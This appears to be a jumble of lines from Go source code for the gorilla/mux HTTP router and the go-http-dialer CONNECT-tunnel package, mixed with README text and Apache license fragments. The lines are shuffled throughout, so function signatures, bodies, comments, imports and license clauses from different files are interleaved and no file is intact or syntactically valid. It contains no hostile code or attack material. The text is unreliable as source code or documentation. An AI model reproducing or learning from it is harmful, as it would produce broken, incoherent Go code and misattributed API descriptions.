// URLPath builds the path part of the URL for a route. See Route.URL().
// The name used to build URLs.
Route) MatcherFunc(f MatcherFunc) 
// The above route will only match if the URL contains the defined queries
// Schemes adds a matcher for URL schemes.
"// GetName returns the name for the route, if any."
"Route) GetQueriesRegexp() ([]string, error) {"
"// It accepts a sequence of schemes to be matched, e.g.: ""http"", ""https""."
// ----------------------------------------------------------------------------
} else {
foo=bar
"// the prefix ""/foo"") so you may want to use a trailing slash here."
// An error will be returned if the route does not define a path.
// Route stores information to match a request and build URLs.
"//                                      ""category"", ""technology"","
type headerRegexMatcher map[string]
return true
type headerMatcher map[string]string
"http.Request, match "
// Request handler for the route.
id=42.
// Methods adds a matcher for HTTP methods.
"// GetError returns an error resulted from building the route, if any."
return r.skipClean
"Route) addRegexpMatcher(tpl string, typ regexpType) error {"
Route) Handler(handler http.Handler) 
// Match returns the match for a given request.
"for k, v := range schemes {"
"r.err = fmt.Errorf(""mux: route already has name %q, can't set %q"","
// support. For example:
// It accepts a template with zero or more URL variables enclosed by {}. The
"headers, r.err = mapFromPairsToString(pairs...)"
if match.Vars == nil {
// Query ----------------------------------------------------------------------
 typ == regexpTypePrefix {
"var scheme, host, path string"
Route) Subrouter() 
"// Note that it does not treat slashes specially (""/foobar/"" will be matched by"
Route) buildVars(m map[string]string) map[string]string {
// The above route will only match if both request header values match.
// MatcherFunc ----------------------------------------------------------------
Route) URL(pairs ...string) (
"return nil, err"
m = r.buildVarsFunc(m)
func (m schemeMatcher) Match(r 
type schemeMatcher []string
"return r.regexp.path.regexp.String(), nil"
"// We found a route which matches request method, clear MatchErr"
type matcher interface {
// It is an error to call Name more than once on a route.
"return u, nil"
type MatcherFunc func(
return false
// PathPrefix adds a matcher for the URL path prefix. This matches if the given
Route) URLPath(pairs ...string) (
"return nil, errors.New(""mux: route doesn't have queries"")"
// PathPrefix -----------------------------------------------------------------
// Use of this source code is governed by a BSD-style
"//     r.HeadersRegexp(""Content-Type"", ""application/(text"
r.addMatcher(router)
matchErr = ErrMethodMismatch
// Match matches the route against the request.
//       Handler(ArticleHandler)
"// Here, the routes registered in the subrouter won't be tested if the host"
"//       HandleFunc(""/articles/{category}/{id:[0-9]"
"//       Name(""article"")"
// - {name} matches anything until the next dot.
"// HeadersRegexp accepts a sequence of key/value pairs, where the value has regex"
// Match everything.
// BuildVarsFunc adds a custom function to be used to modify build variables
// the tpl argument.
//     r := mux.NewRouter()
// headerMatcher matches the request against header values.
"return """", r.err"
Match(
// GetQueriesRegexp returns the expanded regular expressions used to match the
Route) GetError() error {
"Router{routeConf: copyRouteConf(r.routeConf), namedRoutes: r.namedRoutes}"
err error
"//     r.Host(""{subdomain:[a-z]"
"//     // url.String() will be ""http://news.domain.com/articles/technology/42"""
"""strings"""
// It accepts a sequence of key/value pairs for the route variables. For
"r.err = r.addRegexpMatcher(tpl, regexpTypePath)"
// GetPathTemplate returns the template used to build the
// compose the old and new functions
"return matchMapWithRegex(m, r.Header, true)"
"queries = append(queries, query.template)"
// to Subrouters.
r.buildOnly = true
"//     r.Host(""www.example.com"")"
// config possibly passed in from 
return f(old(m))
"return r.regexp.host.template, nil"
"// BuildVarsFunc, it is invoked."
// initialize a subrouter with a copy of the parent route's configuration
return r.handler
"http.Request, "
Route) Host(tpl string) 
scheme = r.buildScheme
// Path -----------------------------------------------------------------------
func (m MatcherFunc) Match(r 
Route) BuildVarsFunc(f BuildVarsFunc) 
Route) Queries(pairs ...string) 
"RawQuery: strings.Join(queries, """
"//     s := r.Host(""www.example.com"").Subrouter()"
return r.name
"Path:     path,"
"// All variables defined in the route are required, and their values must"
"return fmt.Errorf(""mux: path must start with a slash, got %q"", tpl)"
if err != nil {
var query string
"Path: path,"
"""fmt"""
return r.addMatcher(f)
"path, err := r.regexp.path.url(values)"
pairs[i
"if host, err = r.regexp.host.url(values)"
// Handler sets a handler for the route.
if length%2 != 0 {
// Schemes --------------------------------------------------------------------
r.name = name
"for _, q := range r.regexp.queries {"
"if query, err = q.url(values)"
type BuildVarsFunc func(map[string]string) map[string]string
// addMatcher adds a matcher to the route.
// Variable names must be unique in a given route. They can be retrieved
Route) SkipClean() bool {
"}, nil"
return r
// The route must have a host defined.
r.regexp.path = rr
 r.err != nil {
"scheme = ""http"""
return 
methods[k] = strings.ToUpper(v)
"// If the value is an empty string, it will match any value if the key is set."
// Queries adds a matcher for URL query values.
// An error will be returned if the route does not have queries.
// Then override the mis-matched handler
// ...which will return an url.URL with the following path:
// - {name:pattern} matches the given regexp pattern.
Route) Methods(methods ...string) 
Route
r.handler = handler
// matcher types try to match a request.
// It will test the inner routes only if the parent route matched. For example:
// against third-party services.
"json)"","
// Router.SkipClean.
"r.matchers = append(r.matchers, m)"
"Route) prepareVars(pairs ...string) (map[string]string, error) {"
// Subrouter ------------------------------------------------------------------
return r.addMatcher(schemeMatcher(schemes))
"Route) HandlerFunc(f func(http.ResponseWriter, "
regexp.Regexp
func (r 
if match.Handler == nil {
// Also note that the setting of Router.StrictSlash() has no effect on routes
"r.regexp.setMatch(req, match, r)"
RouteMatch) bool
"r.name, name)"
// - {name} matches anything until the next slash.
"if path, err = r.regexp.path.url(values)"
"//     r.Headers(""Content-Type"", ""application/json"","
 tpl
"for _, query := range r.regexp.queries {"
"strictSlash:    r.strictSlash,"
// Subrouter creates a subrouter for the route.
// schemeMatcher matches the request against URL schemes.
// URL building
func (m headerMatcher) Match(r 
"Scheme:   scheme,"
"//     r.Path(""/products/"").Handler(ProductsHandler)"
r.addMatcher(rr)
"return matchMapWithString(m, r.Header, true)"
match.Vars = make(map[string]string)
// Name -----------------------------------------------------------------------
// Headers adds a matcher for request header values.
// route queries.
var headers map[string]
"//     r.HandleFunc(""/articles/{category}/{id:[0-9]"
// HandlerFunc sets a handler function for the route.
"//     r.Path(""/articles/{category}/{id:[0-9]"
if r.regexp.host == nil {
if typ == regexpTypeQuery {
r.regexp.host = rr
// functions (which can modify route variables before a route's URL is built).
"queries = append(queries, query.regexp.String())"
routeConf
"Host:     host,"
// prepareVars converts the route variable pairs into a map. If the route has a
return r.addMatcher(headerRegexMatcher(headers))
// Handler --------------------------------------------------------------------
return m
// Copyright 2012 The Gorilla Authors. All rights reserved.
"""net/url"""
"return """", errors.New(""mux: route doesn't have a path"")"
url.URL{
r.namedRoutes[name] = r
"""mux: number of parameters must be multiple of 2, got %v"", pairs)"
Route) Path(tpl string) 
// This prevents subsequent matching subrouters from failing to
u.Scheme = r.buildScheme
var queries []string
// GetMethods returns the methods the route matches against
// Error resulted from building a route.
"return queries, nil"
matchErr = nil
// BuildOnly sets the route to never match: it is only used to build URLs.
"//     url, err := r.Get(""article"").URL(""category"", ""technology"", ""id"", ""42"")"
 err != nil {
Route) URLHost(pairs ...string) (
// methodMatcher matches the request against HTTP methods.
return err
// template is a prefix of the full URL path. See Route.Path() for details on
"return r.regexp.path.template, nil"
"""net/http"""
"return """", errors.New(""mux: route doesn't have a host"")"
if typ == regexpTypeHost {
"Route) GetPathRegexp() (string, error) {"
"// values, e.g.: "
"if r.buildScheme != """" {"
"queries := make([]string, 0, len(r.regexp.queries))"
if r.regexp.queries == nil {
// query matching.
// with a PathPrefix matcher.
"//               ""X-Requested-With"", ""XMLHttpRequest"")"
match.MatchErr = nil
"for k, v := range methods {"
// addRegexpMatcher adds a host or path matcher and builder to a route.
// Host -----------------------------------------------------------------------
if r.buildVarsFunc != nil {
return router
r.buildVarsFunc = f
return r.err
Route) BuildOnly() 
if len(schemes) > 0 {
if match.MatchErr == ErrMethodMismatch {
// MatcherFunc is the function signature used by custom matchers.
"return nil, r.err"
Route) HeadersRegexp(pairs ...string) 
r.buildVarsFunc = func(m map[string]string) map[string]string {
type Route struct {
"Scheme: ""http"","
"return matchInArray(m, r.URL.Scheme)"
r.err = fmt.Errorf(
"}""), ArticleHandler)"
"useEncodedPath: r.useEncodedPath,"
Route) Match(req 
// The route must have a path defined.
// Set variables.
u := 
"// GetHandler returns the handler for the route, if any."
if typ == regexpTypePath 
// headerRegexMatcher matches the request against the route given a regex for the header
"//     s.HandleFunc(""/products/"", ProductsHandler)"
"// If true, this route never matches: it is only used to build URLs."
Router {
// This is useful for building simple REST API documentation and for instrumentation
// It accepts a sequence of key/value pairs to be matched. For example:
var headers map[string]string
 !matched {
"}.domain.com"")"
Router
// An error will be returned if route does not have methods.
return r.addMatcher(methodMatcher(methods))
= 2 {
// It accepts a sequence of key/value pairs. Values may define variables.
// conform to the corresponding patterns.
buildOnly bool
func (m headerRegexMatcher) Match(r 
// Headers --------------------------------------------------------------------
"//     r.Path(""/products/{key}"").Handler(ProductsHandler)"
"// Yay, we have a match. Let's collect some info about it."
// URLHost builds the host part of the URL for a route. See Route.URL().
"values, err := r.prepareVars(pairs...)"
if r.err == nil {
// URL builds a URL for the route.
"// non-nil MatchErr and be skipped, even when there was a"
"// It accepts a sequence of one or more methods to be matched, e.g.:"
Route) GetName() string {
"}"")."
Route) GetHandler() http.Handler {
"//     s.HandleFunc(""/articles/{category}/{id:[0-9]"
"// ""global"" reference to all named routes"
// Methods --------------------------------------------------------------------
return nil
if len(tpl) > 0 
"Route) GetHostTemplate() (string, error) {"
"queries = append(queries, query)"
// doesn't match.
"return """", errors.New(""mux: route does not have a path"")"
"// Name sets the name for the route, used to build URLs."
handler http.Handler
"return m(r, match)"
"if methods, ok := m.(methodMatcher)"
// This also works for host variables:
// MatcherFunc adds a custom function to be used as request matcher.
"tpl = strings.TrimRight(r.regexp.path.template, ""/"") "
"r.regexp.queries = append(r.regexp.queries, rr)"
"host, err := r.regexp.host.url(values)"
// Matchers
// It accepts a template with zero or more URL variables enclosed by {}.
"rr, err := newRouteRegexp(tpl, typ, routeRegexpOptions{"
Route {
func (m methodMatcher) Match(r 
"""regexp"""
Route) PathPrefix(tpl string) 
namedRoutes map[string]
continue
// Host adds a matcher for the URL host.
var matchErr error
"}"", ArticleHandler)."
// license that can be found in the LICENSE file.
"//     s.HandleFunc(""/products/{key}"", ProductHandler)"
"return nil, errors.New(""mux: route doesn't have methods"")"
// Variables can define an optional regexp pattern to be matched:
old := r.buildVarsFunc
"if err = uniqueVars(rr.varsN, r.regexp.path.varsN)"
"if r.name != """" {"
// Ignore ErrNotFound errors. These errors arise from match call
 ok {
if r.regexp.path != nil {
Route) Name(name string) 
// SkipClean reports whether path cleaning is enabled for this route via
import (
"if err = uniqueVars(rr.varsN, r.regexp.host.varsN)"
// Use the start and end of string anchors (
 and $) to match an exact value.
if r.err = r.addRegexpMatcher(pairs[i]
// GetQueriesTemplates returns the templates used to build the
"//     r.Host(""{subdomain}.domain.com"")."
match.Handler = r.handler
"//     r.Queries(""foo"", ""bar"", ""id"", ""{id:[0-9]"
"return nil, errors.New(""mux: route doesn't have a path"")"
// The above route will only match if both the request header matches both regular expressions.
"m, err := mapFromPairsToString(pairs...)"
// GetPathRegexp returns the expanded regular expression used to match route path.
"// example, given this route:"
r.buildScheme = schemes[0]
"if err = uniqueVars(rr.varsN, q.varsN)"
for i := 0
"r.err = r.addRegexpMatcher(tpl, regexpTypePrefix)"
// GetHostTemplate returns the template used to build the
schemes[k] = strings.ToLower(v)
"url.URL, error) {"
return r.addMatcher(headerMatcher(headers))
name string
// ...a URL for it can be built using:
"Route) GetPathTemplate() (string, error) {"
match.MatchErr = matchErr
// Path adds a matcher for the URL path.
"return r.buildVars(m), nil"
if match.MatchErr == ErrNotFound {
// Route attributes
"// run middleware. If not ignored, the middleware would see a"
// An error will be returned if the route does not define a host.
type methodMatcher []string
// before a route's URL is built.
// BuildVarsFunc is the function signature used by custom build variable
"//     r.Host(""{subdomain}.domain.com"")"
// route match.
Route) Headers(pairs ...string) 
if r.regexp.host != nil {
"for _, m := range r.matchers {"
"Route) GetMethods() ([]string, error) {"
 tpl[0] != '/' {
 i < length
"// ""GET"", ""POST"", ""PUT""."
"return []string(methods), nil"
if matchErr != nil {
// matching route.
"Host:   host,"
"//                                      ""id"", ""42"")"
// BuildVarsFunc --------------------------------------------------------------
// calling mux.Vars(request).
if r.buildOnly 
if r.regexp.path == nil {
// For example:
if match.Route == nil {
"//     ""/articles/technology/42"""
"r.err = r.addRegexpMatcher(tpl, regexpTypeHost)"
Route) addMatcher(m matcher) 
type MiddlewareFunc func(http.Handler) http.Handler
RouteMatch{}) {
import (
"Router, req "
if err == nil {
"Route, _ "
"// Typically, the returned handler is a closure which does something with the http.ResponseWriter and http.Request passed"
type middleware interface {
"if m.Match(req, "
"methods, err := route.GetMethods()"
"for _, m := range route.matchers {"
// getAllMethodsForRoute returns all the methods from method matchers matching a given
var allMethods []string
"next.ServeHTTP(w, req)"
"return allMethods, err"
// middleware interface is anything which implements a MiddlewareFunc named Middleware.
if v == http.MethodOptions {
Route) error {
 ok {
"Router, _ []"
"for _, fn := range mwf {"
"http.Request) ([]string, error) {"
func CORSMethodMiddleware(r 
return func(next http.Handler) http.Handler {
return nil
Router) MiddlewareFunc {
func getAllMethodsForRoute(r 
Middleware(handler http.Handler) http.Handler
"if _, ok := m.("
// the route. Routes that do not explicitly handle OPTIONS requests will not be processed
func (mw MiddlewareFunc) Middleware(handler http.Handler) http.Handler {
http.Request) {
"allMethods, err := getAllMethodsForRoute(r, req)"
// CORSMethodMiddleware automatically sets the Access-Control-Allow-Methods response header
return err
func (r 
Router) useInterface(mw middleware) {
routeRegexp)
Router) Use(mwf ...MiddlewareFunc) {
"w.Header().Set(""Access-Control-Allow-Methods"", strings.Join(allMethods, "",""))"
"for _, v := range allMethods {"
// Middleware allows MiddlewareFunc to implement the middleware interface.
package mux
"r.middlewares = append(r.middlewares, fn)"
// on requests for routes that have an OPTIONS method matcher to all the method matchers on
break
// by the middleware. See examples for usage.
err := r.Walk(func(route 
"r.middlewares = append(r.middlewares, mw)"
if err != nil {
"allMethods = append(allMethods, methods...)"
"// useInterface appends a middleware to the chain. Middleware can be used to intercept or otherwise modify requests and/or responses, and are executed in the order that they are applied to the Router."
"return http.HandlerFunc(func(w http.ResponseWriter, req "
"""strings"""
"// Use appends a MiddlewareFunc to the chain. Middleware can be used to intercept or otherwise modify requests and/or responses, and are executed in the order that they are applied to the Router."
"""net/http"""
return mw(handler)
// request.
// MiddlewareFunc is a function which receives an http.Handler and returns another http.Handler.
"// to it, and then calls the handler passed as parameter to the MiddlewareFunc."
// routeRegexpGroup groups the route matchers that carry variables.
"// a ""reverse"" template to build URLs and compile regexps to validate variable"
output[name] = input[matches[2
"// The URL is checked against the full regexp, instead of checking"
"func braceIndices(s string) ([]int, error) {"
"func extractVars(input string, matches []int, names []string, output map[string]string) {"
var idxs []int
regexpTypeHost   regexpType = 1
"template:         template,"
"http.Request, m "
varsR := make([]
"pattern.WriteString(""[/]"
"RouteMatch, r "
varsN[i/2] = name
"routeRegexp, error) {"
path = req.URL.EscapedPath()
// Backup the original.
strictSlash    bool
if errBraces != nil {
var err error
"if name == """" "
 vals[0]
 level == 1 {
// Previously we accepted only Python-like identifiers for variable
Route) {
"return nil, fmt.Errorf(""mux: missing name or pattern in %q"","
RouteMatch) bool {
"regexp.Regexp, len(idxs)/2)"
if r.URL.IsAbs() {
routeRegexp
"= ""/"""
path := req.URL.Path
"fmt.Fprintf(pattern, ""%s("
if !ok {
http.Request) string {
" queryVal == """" {"
routeRegexp) getURLQuery(req 
"""bytes"""
// names ([a-zA-Z_][a-zA-Z0-9_]
if r.useEncodedPath {
if typ == regexpTypeQuery {
if !r.varsR[k].MatchString(values[v]) {
"panic(fmt.Sprintf(""route %s contains capture groups in its regexp. "", template) "
pattern.WriteByte('
http.Request) bool {
"baz=ding, we return only the relevant key"
"idxs, errBraces := braceIndices(tpl)"
":pattern) instead of (pattern)"")"
// setMatch extracts the variables from the URL once a route matches.
"""strconv"""
reverse string
package mux
// Expanded regexp.
"templateKey := strings.SplitN(r.template, ""="", 2)[0]"
return r.Host
// Check for capturing groups which used to work in older versions
"regexp:           reg,"
if p1 != p2 {
// Add the remaining.
// can include the port number if the default value of 80 is not used.
// Check if we should redirect.
"idxs = append(idxs, idx, i"
// Set all values we are interested in.
regexp 
"""strings"""
"wildcardHostPort: wildcardHostPort,"
"return """", fmt.Errorf(""mux: missing route variable %q"", v)"
"options:          options,"
"defaultPattern = ""["
end = idxs[i
if r.regexpType != regexpTypeQuery {
"varsR:            varsR,"
// Copyright 2012 The Gorilla Authors. All rights reserved.
"if i := strings.Index(host, "":"")"
varsR []
// getURLQuery returns a single query parameter from a request URL.
queryURL := q.getURLQuery(req)
// value pair for the routeRegexp.
"""net/url"""
reverse.WriteString(raw)
// values used in URL building.
" ""="" "
urlValues[k] = value
raw := tpl[end:]
endSlash = true
template := tpl
// Match matches the regexp against the URL host or path.
// braceIndices returns the first level curly brace indices from a string.
"func newRouteRegexp(tpl string, typ regexpType, options routeRegexpOptions) ("
"return """""
options routeRegexpOptions
if !r.regexp.MatchString(rv) {
// According to section 14.23 of RFC 2616 the Host header
parts := strings.SplitN(tpl[idxs[i]
// getHost tries its best to return the request host.
// varGroupName builds a capturing group name for the indexed variable.
path    
"reverse:          reverse.String(),"
 i < len(idxs)
"""regexp"""
name := parts[0]
var end int
regexpTypePrefix regexpType = 2
pattern.WriteString(regexp.QuoteMeta(raw))
// It returns an error in case of unbalanced braces.
"return ""v"" "
// routeRegexp stores a regexp to match a host or path and information to
 strconv.Itoa(idx)
host    
if options.strictSlash {
if p1 {
func getHost(r 
} else if level < 0 {
// For a URL with foo=bar
// Store host variables.
// Only match strict slash if not matching
// Options for matching
if level != 0 {
// license that can be found in the LICENSE file.
"), but currently the only restriction is that"
pattern.WriteString(defaultPattern)
 i != -1 {
routeRegexp) matchQueryString(req 
type routeRegexp struct {
// ----------------------------------------------------------------------------
return r.matchQueryString(req)
patt := defaultPattern
if errCompile != nil {
} else {
return r.regexp.MatchString(path)
"// used to match a host, a path or a query string."
"fmt.Fprintf(reverse, ""%s%%s"", raw)"
// collect and validate route variables.
"value, ok := values[v]"
"m.Handler = http.RedirectHandler(u.String(), http.StatusMovedPermanently)"
"return rv, nil"
if err != nil {
"reg, errCompile := regexp.Compile(pattern.String())"
"for _, q := range v.queries {"
// Set a flag for strictSlash.
"""net/http"""
tpl[idxs[i]:end])
// Variable names.
if level
if typ == regexpTypeHost {
r.varsR[k].String())
"http.Request, match "
"""mux: variable %q doesn't match, expected %q"", values[v],"
// Build the reverse template.
"return nil, fmt.Errorf(""mux: unbalanced braces in %q"", s)"
"""fmt"""
endSlash := false
raw := tpl[end:idxs[i]]
wildcardHostPort = true
"routeRegexp) url(values map[string]string) (string, error) {"
if v.path != nil {
import (
if options.strictSlash 
if typ != regexpTypePrefix {
"var level, idx int"
"1:end-1], "":"", 2)"
"// newRouteRegexp parses a route template and returns a routeRegexp,"
routeRegexp) Match(req 
if endSlash {
// url builds a URL part using the given values.
regexpTypeQuery  regexpType = 3
"urlValues := make([]interface{}, len(r.varsN))"
"return nil, errBraces"
"regexpType:       typ,"
"// name and pattern can't be empty, and names can't contain a colon."
"return idxs, nil"
var wildcardHostPort bool
 len(vals) > 0 {
u.Path 
" strings.HasSuffix(tpl, ""/"") {"
value = url.QueryEscape(value)
// Name or pattern can't be empty.
if r.regexpType == regexpTypeHost {
"return nil, errCompile"
reverse.WriteByte('/')
if len(matches) > 0 {
" patt == """" {"
for i := 0
// routeRegexpGroup
"varsN:            varsN,"
"rv := fmt.Sprintf(r.reverse, urlValues...)"
if r.regexpType == regexpTypeQuery {
switch s[i] {
"varsR[i/2], err = regexp.Compile(fmt.Sprintf("""
// Don't be strict on the port match
"for key, vals := range req.URL.Query() {"
useEncodedPath bool
"}, nil"
"u, _ := url.Parse(req.URL.String())"
"// message, we check individual regexps if the URL doesn't match."
if len(parts) == 2 {
type routeRegexpOptions struct {
} else if typ == regexpTypeHost {
"p2 := strings.HasSuffix(v.path.template, ""/"")"
regexpTypePath   regexpType = 0
"reverse := bytes.NewBufferString("""")"
return key 
// Build the regexp pattern.
// individual variables. This is faster but to provide a good error
// Store path variables.
"// It will extract named variables, assemble a regexp to be matched, create"
"defaultPattern := ""["
if key == templateKey 
// Store query string variables.
if v.host != nil {
// Compile full regexp.
return 
return r.regexp.MatchString(host)
case '}':
 level == 0 {
if typ != regexpTypePath {
"return nil, err"
if r.wildcardHostPort {
if reg.NumSubexp() != len(idxs)/2 {
type routeRegexpGroup struct {
idx = i
wildcardHostPort bool
case '{':
return r.URL.Host
"for k, v := range r.varsN {"
type regexpType int
"defaultPattern = ""."
regexpType regexpType
template string
"for i, name := range names {"
"extractVars(host, matches, v.host.varsN, m.Vars)"
options.strictSlash = false
"pattern := bytes.NewBufferString("""")"
 i < len(s)
matches := v.path.regexp.FindStringSubmatchIndex(path)
if v.path.options.strictSlash {
host := getHost(req)
"P<%s>%s)"", regexp.QuoteMeta(raw), varGroupName(i/2), patt)"
// Done!
"return """", fmt.Errorf("
matches := q.regexp.FindStringSubmatchIndex(queryURL)
// Variable regexps (validators).
"if queryVal := strings.SplitN(template, ""="", 2)[1]"
// Append variable name and compiled pattern.
patt = parts[1]
"if !strings.Contains(pattern.String(), "":"") {"
// The type of match
// Reverse template.
func (v routeRegexpGroup) setMatch(req 
"extractVars(queryURL, matches, q.varsN, m.Vars)"
tpl = tpl[:len(tpl)-1]
"extractVars(path, matches, v.path.varsN, m.Vars)"
pattern.WriteByte('$')
"p1 := strings.HasSuffix(path, ""/"")"
// Use of this source code is governed by a BSD-style
// Now let's parse it.
if level--
u.Path = u.Path[:len(u.Path)-1]
// Check if it is well-formed.
// Add the default pattern if the query value is empty
matches := v.host.regexp.FindStringSubmatchIndex(host)
2]:matches[2
regexp.Regexp
func (r 
routeRegexp{
return r.regexp.MatchString(r.getURLQuery(req))
queries []
// Wildcard host-port (no strict port match in hostname)
varsN []string
= 2 {
"""Only non-capturing groups are accepted: e.g. ("
if r.options.useEncodedPath {
host = host[:i]
// The unmodified template.
"varsN := make([]string, len(idxs)/2)"
func varGroupName(idx int) string {
"%s$"", patt))"
const (
// Copyright 2012 The Gorilla Authors. All rights reserved.
"import ""net/http"""
// copy is returned.
package mux
 it provides a way to
func SetURLVars(r 
"// can be set by making a route that captures the required variables,"
// starting a server and sending the request to that server.
"// inject variables into the request context. Alternatively, URL variables"
// Use of this source code is governed by a BSD-style
"// SetURLVars sets the URL variables for the given request, to be accessed via"
"return setVars(r, val)"
"http.Request, val map[string]string) "
// license that can be found in the LICENSE file.
"// mux.Vars for testing route behaviour. Arguments are not modified, a shallow"
// This API should only be used for testing purposes
http.Request {
module github.com/gorilla/mux
return func(t 
// HttpTunnel represents a configured HTTP Connect Tunnel dialer.
return t
"resp, err = t.doRoundtrip(conn, req)"
// See LICENSE for licensing terms.
if resp.StatusCode == http.StatusProxyAuthRequired 
func (t 
url.URL) {
parentDialer: 
 t.auth.InitialResponse())
if err := req.Write(conn)
"Method: ""CONNECT"","
"url.URL{Opaque: address},"
" "" "" "
func WithProxyAuth(auth ProxyAuthorization) opt {
proxyAddr    string
HttpTunnel) parseProxyUrl(proxyUrl 
"// The first parameter is a proxy URL, for example https://foo.example.com:9090 will use foo.example.com as proxy on"
net.Dialer) opt {
"""strings"""
tlsConfig    
" "":443"""
respAuthHdr := resp.Header.Get(hdrProxyAuthReq)
"return nil, fmt.Errorf(""http_tunnel: failed writing request: %v"", err)"
"Header: make(http.Header),"
"""net/url"""
net.Dialer
// WithDialer allows the customization of the underlying net.Dialer used for establishing TCP connections to the proxy.
"http.Response) (string, error) {"
// WithConnectionTimeout customizes the underlying net.Dialer.Timeout.
t.tlsConfig = tlsConfig
"return t.parentDialer.Dial(""tcp"", t.proxyAddr)"
// New constructs an HttpTunnel to be used a net.Dial command.
"Host:   address, // This is weird"
"return nil, fmt.Errorf(""network type '%v' unsupported (only 'tcp')"", network)"
"if !strings.Contains(t.proxyAddr, "":"") {"
parentDialer 
" "":8080"""
// Copyright 2016 Michal Witkowski. All Rights Reserved.
func WithTls(tlsConfig 
"responseHdr, err := t.performAuthChallengeResponse(resp)"
tls.Config) opt {
func New(proxyUrl 
 err != nil {
// Package http_dialer provides HTTP(S) CONNECT tunneling net.Dialer. It allows you to
http.Request{
HttpTunnel{
// WithTls sets the tls.Config to be used (e.g. CA certs) when connecting to an HTTP proxy over TLS.
} else {
"if network != ""tcp"" {"
" "" "") {"
"return conn, nil"
"return t.auth.ChallengeResponse(challenge), nil"
"if !strings.Contains(respAuthHdr, t.auth.Type() "
if err != nil {
"for _, opt := range opts {"
req := 
"""net/http"""
t.isTls = false
package http_dialer
"""fmt"""
HttpTunnel {
HttpTunnel) performAuthChallengeResponse(resp 
// establish arbitrary TCP connections (as long as your proxy allows them) through a HTTP(S) CONNECT point.
challenge := splits[1]
import (
// port 9090 using TLS for connectivity.
t.parentDialer = dialer
"net.Dialer{},"
opt(t)
HttpTunnel) {
t := 
auth         ProxyAuthorization
" t.auth.InitialResponse() != """" {"
"http.Response, error) {"
"// Optional customization parameters are available, e.g.: WithTls, WithDialer, WithConnectionTimeout"
"""net"""
type opt func(
tls.Config
t.parentDialer.Timeout = timeout
if !t.isTls {
http.Request) (
t.proxyAddr = t.proxyAddr 
t.parseProxyUrl(proxyUrl)
"resp, err := t.doRoundtrip(conn, req)"
t.isTls = true
"HttpTunnel) doRoundtrip(conn net.Conn, req "
"if strings.ToLower(proxyUrl.Scheme) == ""https"" {"
"return tls.DialWithDialer(t.parentDialer, ""tcp"", t.proxyAddr, t.tlsConfig)"
"// Retry request with auth, if available."
"""time"""
 responseHdr)
"return """", fmt.Errorf(""http_tunnel: expected '%v' Proxy authentication, got: '%v'"", t.auth.Type(), respAuthHdr)"
"return http.ReadResponse(br, req)"
func WithDialer(dialer 
"HttpTunnel) Dial(network string, address string) (net.Conn, error) {"
if resp.StatusCode != 200 {
"return nil, err"
"// Dial is an implementation of net.Dialer, and returns a TCP connection handle to the host that HTTP CONNECT reached."
"return nil, fmt.Errorf(""http_tunnel: failed dialing to proxy: %v"", err)"
conn.Close()
URL:    
t.proxyAddr = proxyUrl.Host
type HttpTunnel struct {
if t.auth != nil 
HttpTunnel)
"url.URL, opts ...opt) "
"req.Header.Set(hdrProxyAuthResp, t.auth.Type() "
"return nil, fmt.Errorf(""http_tunnel: failed proxying %d: %s"", resp.StatusCode, resp.Status)"
"""bufio"""
// WithProxyAuth allows you to add ProxyAuthorization to calls.
func WithConnectionTimeout(timeout time.Duration) opt {
t.auth = auth
"HttpTunnel) dialProxy() (net.Conn, error) {"
"conn, err := t.dialProxy()"
"splits := strings.SplitN(respAuthHdr, "" "", 2)"
 t.auth != nil {
isTls        bool
"""crypto/tls"""
"// Doesn't matter, discard this bufio."
br := bufio.NewReader(conn)
Some enterprises have fairly restrictive networking environments. They typically operate [HTTP forward proxies](https://en.wikipedia.org/wiki/Proxy_server) that require user authentication. These proxies usually allow  HTTPS (TCP to 
[![GoDoc](http://img.shields.io/badge/GoDoc-Reference-blue.svg)](https://godoc.org/github.com/mwitkow/go-http-dialer)
[![Travis Build](https://travis-ci.org/mwitkow/go-http-dialer.svg)](https://travis-ci.org/mwitkow/go-http-dialer)
net.Dialer
http://proxy.example.com:3128
" TLS over an HTTP proxy, you can't."
section-9.9) method. The 
CONNECT
https://proxy.example.com
Basic
 - [x] TLS connection to proxy (customizeable) (e.g. 
go-http-dialer
Because if you want to call [gRPC](http://www.grpc.io/) services which are exposed publicly over 
:443
... if your proxy allows you to 
 is released under the Apache 2.0 license. See the [LICENSE](LICENSE) file for details.
 HTTP CONNECT tunneling Go Dialer
 Usage with gRPC
 Supported features
RemoteAddr
" method is basically a HTTP-negotiated ""end-to-end"" TCP stream... which is exactly what ["
", with challenge-response semantics"
) to pass through the proxy using the [
net.Conn
 License
[![Apache 2.0 License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
 - [ ] appropriate 
[![Go Report Card](https://goreportcard.com/badge/github.com/mwitkow/go-http-dialer)](http://goreportcard.com/report/mwitkow/go-http-dialer)
Proxy-Authenticate
HTTP_CONNECT_tunneling).
](https://tools.ietf.org/html/rfc2616
 drop-in that establishes the TCP connection over an [HTTP CONNECT Tunnel](https://en.wikipedia.org/wiki/HTTP_tunnel
 - [x] out of the box support for 
 - [x] unencrypted connection to proxy (e.g. 
Conn) is :)
](https://golang.org/pkg/net/
" But, really, why"
 - [x] customizeable for 
 remapping
 Why
 auth
"Also, this allows you to call any TCP service over HTTP "
"      To apply the Apache License to your work, attach the following"
      meet the following conditions:
 within the Source form or
"      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or"
"      incidental, or consequential damages of any character arising as a"
"          that You distribute, all copyright, patent, trademark, and"
          the Derivative Works
"      communication on electronic mailing lists, source code control systems,"
"      ""Contributor"" shall mean Licensor and any individual or Legal Entity"
"      for any such Derivative Works as a whole, provided Your use,"
"      reproduction, and distribution of the Work otherwise complies with"
   2. Grant of Copyright License. Subject to the terms and conditions of
"          or as an addendum to the NOTICE text from the Work, provided"
   4. Redistribution. You may reproduce and distribute copies of the
      may provide additional or different license terms and conditions
      or by an individual or Legal Entity authorized to submit on behalf of
      as of the date such litigation is filed.
"      or contributory patent infringement, then any patent licenses"
"      ""You"" (or ""Your"") shall mean an individual or Legal Entity"
      Contribution(s) alone or by combination of their Contribution(s)
      or other liability obligations and/or rights consistent with this
"      designated in writing by the copyright owner as ""Not a Contribution."""
      subsequently incorporated within the Work.
      with Licensor regarding such Contributions.
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      excluding communication that is conspicuously marked or otherwise
"          documentation, if provided along with the Derivative Works"
"      names, trademarks, service marks, or product names of the Licensor,"
      (a) You must give any other recipients of the Work or
"      same ""printed page"" as the copyright notice for easier"
      comment syntax for the file format. We also recommend that a
"      means any form of electronic, verbal, or written communication sent"
